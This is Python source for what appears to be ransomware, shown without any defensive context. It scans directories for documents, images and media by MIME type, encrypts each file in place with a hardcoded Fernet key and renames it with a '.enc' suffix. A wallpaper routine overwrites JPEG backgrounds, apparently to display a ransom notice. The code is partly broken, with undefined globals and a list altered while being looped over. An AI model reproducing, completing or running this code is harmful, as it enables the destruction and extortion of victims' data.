import os
import base64
import threading
import magic
from cryptography.fernet import Fernet

mimes = ['video/x-msvideo', 'application/octet-stream', 'application/x-bzip', 'application/x-bzip2', 'text/css', 'text/csv', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'image/gif', 'text/html', 'text/plain', 'image/jpeg', 'application/json', 'text/markdown', 'text/javascript', 'audio/mpeg', 'video/mp4', 'video/mpeg', 'audio/ogg', 'video/ogg', 'image/png', 'application/pdf']
wdirs = ['/usr/share/backgrounds']
wfiles = []
key = b'OpBGO6mL32_5JjnibDDqi8KMoxjllVQbJBiic__lVGs='
fernet = Fernet(key)


def wallpaper():
	wlpdata = b''
	wdirs = os.listdir('/usr/share/backgrounds')
	wfiles = []

	for d in wdirs:
		full_path = os.path.join('/usr/share/backgrounds', d)
		if os.path.islink(full_path):
			continue
		elif os.path.isdir(full_path):
			wdirs.append(full_path)
		elif os.path.isfile(full_path):
			wfiles.append(full_path)

	input()

	fmagic = magic.Magic(mime=True)
	for f in wfiles:
		ftype = fmagic.from_file(f)
		if ftype == 'image/jpeg':
			with open(f, 'wb') as file:
				file.write(base64.b64decode(wlpdata))


def verifymime(path):
	try:
		path = os.path.normpath(path)
		fmagic = magic.Magic(mime=True)
		ftype = fmagic.from_file(path)

		if ftype in mimes:
			files.append(path)
	except OSError:
		None


def listdir(path):
	try:
		for file in os.listdir(path):
			full_path = os.path.join(path, file)
			if os.path.islink(full_path):
				continue
			if os.path.isdir(full_path):
				dirs.append(full_path)
			if os.path.isfile(full_path):
				verifymime(full_path)
	except PermissionError:
		None


def encrypt(path):
	with semaforo:
		try:
			with open(path, 'rb') as f:
				data = f.read()
			enc_data = fernet.encrypt(data)
			with open(path, 'wb') as f:
				f.write(enc_data)
			os.rename(path, path+'.enc')
		except PermissionError:
			None


